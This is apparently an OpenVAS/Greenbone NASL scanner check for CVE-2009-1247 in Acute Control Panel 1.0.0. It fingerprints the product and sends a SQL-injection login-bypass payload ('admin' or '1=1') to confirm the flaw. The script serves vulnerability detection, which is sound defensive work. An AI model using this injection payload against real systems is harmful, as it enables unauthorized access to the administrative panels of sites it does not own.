# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100089");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-03-29 17:14:47 +0200 (Sun, 29 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1247");
  script_name("Acute Control Panel SQL Injection Vulnerability and Remote File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Acute Control Panel is prone to multiple input-validation
  vulnerabilities, including an SQL-injection issue and multiple remote file-include issues.");

  script_tag(name:"affected", value:"Acute Control Panel 1.0.0 is vulnerable, other versions may also be affected.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to execute malicious code within the
  context of the webserver process, compromise the application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34265");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/acute-cp", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache(item:url, port:port);
  if( ! buf )
    continue;

  if( egrep( pattern:'meta name="generator" content="acute-cp.*" />', string:buf ) ||
      egrep( pattern:'Powered by <a href=[^>]+>Acute CP</a>', string:buf ) ) {

    variables = string("username=admin%20%27%20or%20%27%201=1&password=");
    url = string(dir + "/acute-cp/");

    host = http_host_name( port:port );

    req = string(
      "POST ", url, " HTTP/1.0\r\n",
      "Referer: ","http://", host, url, "\r\n",
      "Host: ", host, "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(variables),
      "\r\n\r\n",
      variables);
    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
    if( ! res )
      continue;

    if( egrep( pattern:"You are now logged in", string:res ) &&
        egrep( pattern:"Logout</a>", string:res ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
